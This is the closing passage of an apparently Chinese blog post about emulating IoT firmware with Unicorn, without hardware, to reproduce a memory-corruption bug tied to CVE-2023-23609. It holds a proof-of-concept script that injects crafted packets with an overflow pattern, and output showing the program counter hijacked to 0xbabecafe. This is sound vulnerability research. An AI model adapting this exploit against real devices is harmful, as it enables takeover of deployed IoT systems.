packet_body_4_n = [b"\x72\x00\x41\x00" + b"\xaa\x02" + b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaa" + b'a'*4 + p32(channel_rx_buffer) + b"xaaayaaazaabbaabcaabdaabeaabfa" for _ in range(4)]


def hook_mem_read(mu, access, address, length, value, user_data):
    global packet_injected, packet_body, packet_body_2, packet_injected_2, packet_body_3, packet_injected_3, emu_cnt
    print(f"[hook_mem_read] {access}, {address:x}, {length}, {value}, {user_data}")
    if length == 4:
        if address == 0x40088828 and packet_injected < len(packet_body) + 1 and emu_cnt == 1:
            if packet_injected == 0:
                mu.mem_write(address, p32(len(packet_body)))
            else:
                mu.mem_write(address, p8(packet_body[packet_injected-1]))
            packet_injected += 1

        elif address == 0x40088828 and packet_injected_2 < len(packet_body_2) + 1 and emu_cnt == 2:
            if packet_injected_2 == 0:
                mu.mem_write(address, p32(len(packet_body_2)))
            else:
                mu.mem_write(address, p8(packet_body_2[packet_injected_2-1]))
            packet_injected_2 += 1

        elif address == 0x40088828 and packet_injected_3 < len(packet_body_3) + 1 and emu_cnt == 3:
            if packet_injected_3 == 0:
                mu.mem_write(address, p32(len(packet_body_3)))
            else:
                mu.mem_write(address, p8(packet_body_3[packet_injected_3-1]))
            packet_injected_3 += 1

        elif address == 0x40088828 and emu_cnt >= 4 and emu_cnt <=7 and packet_injected_4_n[emu_cnt-4] < len(packet_body_4_n[emu_cnt-4]) + 1:
            if packet_injected_4_n[emu_cnt-4] == 0:
                mu.mem_write(address, p32(len(packet_body_4_n[emu_cnt-4])))
            else:
                mu.mem_write(address, p8(packet_body_4_n[emu_cnt-4][packet_injected_4_n[emu_cnt-4]-1]))
            packet_injected_4_n[emu_cnt-4] += 1


        else:
            r = random.choice([0, 1, 0x4000000])   # to bypass sys_ctrl_init, random_init
            # print(f"content: {mu.mem_read(address, 4)}, ready to write random: {r}")
            mu.mem_write(address, p32(r))


def main():
    mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)

    # memory regions
    mu.mem_map(REGION_START, REGION_SIZE)
    mu.mem_map(0xe0000000, 0x10000000) # NVIC

    # load ROM
    mu.mem_write(ROM_BASE, open('hello-world.bin', 'rb').read())

    # write memory / patch code
    # TODO: maybe some patching needed?
    mu.mem_write(0x210926, b"\x70\xBD") # patch fade, POP {R4-R6,PC}
    mu.mem_write(0x210768, b"\x70\x47") # patch wfi
    # why not push pc, or mov pc,lr

    # init SP
    init_sp = u32(mu.mem_read(ROM_BASE, 4))
    reset = u32(mu.mem_read(ROM_BASE + 4, 4))
    mu.reg_write(UC_ARM_REG_SP, init_sp)
    
    # hooks
    mu.hook_add(UC_HOOK_CODE, hook_code)
    mu.hook_add(UC_HOOK_BLOCK, hook_block)
    mu.hook_add(UC_HOOK_MEM_UNMAPPED, hook_mem_unmapped)
    mu.hook_add(UC_HOOK_MEM_READ, hook_mem_read, None, 0x40000000, 0x60000000) # MMIO read

    print(f"reset:{reset:x}")

    mu.emu_start(reset, 0)
    # print(a)


    # interrupt(mu, 2, )

    # TODO: run until
    # 00210768  30bf       wfi

    # TODO: inject RF data available IRQ
    # TODO: reach input_l2cap_conn_req
    
    # TODO: use CVE-2023-23609 to overwrite:
    # 200010e4  uint32_t notification_process = 0x0
    notification_process = u32(mu.mem_read(0x200010e8, 4))
    print(f'notification_process = {notification_process:08x}')
    print(mu.mem_read(0x20001268, 0x8))

    # TODO: inject irq 160 and crash firmware

main()
```

实在是丑陋不堪，但是能用！

```
...
[hook block] 0x203d6c, 2, None
[hook block] 0x203d5a, 4, None
Interrupted...
[hook block] 0x205114, 24, None
[hook block] 0x20512c, 6, None
[hook block] 0x205132, 4, None
[hook block] 0x2052e8, 2, None
[hook block] 0x2052ea, 10, None
0x2052F0: p->state - 1  0x0
[hook block] 0x2052f6, 10, None
[hook block] 0x2052f4, 2, None
[hook block] 0x205136, 6, None
ok
[hook block] 0x205494, 8, None
0x205498: poll_requested  1
[hook block] 0x2054ac, 4, None
[hook block] 0x2053d8, 14, None
[hook block] 0x2053e8, 2, None
[hook block] 0x2053ea, 6, None
[hook block] 0x2053f0, 16, None
[hook block] 0x205398, 10, None
[hook block] 0x2053a2, 8, None
[hook block] 0x2053aa, 14, None
[hook_mem_unmapped] 21, babecafe, 4, 0, None
0xbabecafe Bingo!!
```


## 结束了吗？

本文记录了初次使用 Unicorn，并在没有任何硬件的情况下对某物联网 OS 固件进行软件模拟，并复现某个较易利用的漏洞的过程。笔者对自己写的模拟代码相当不满意，其中也有不少地方可以深究。但目前打算暂放一下，希望几个月后回顾这篇文章时会觉得漏洞百出，依托答辩。收工！
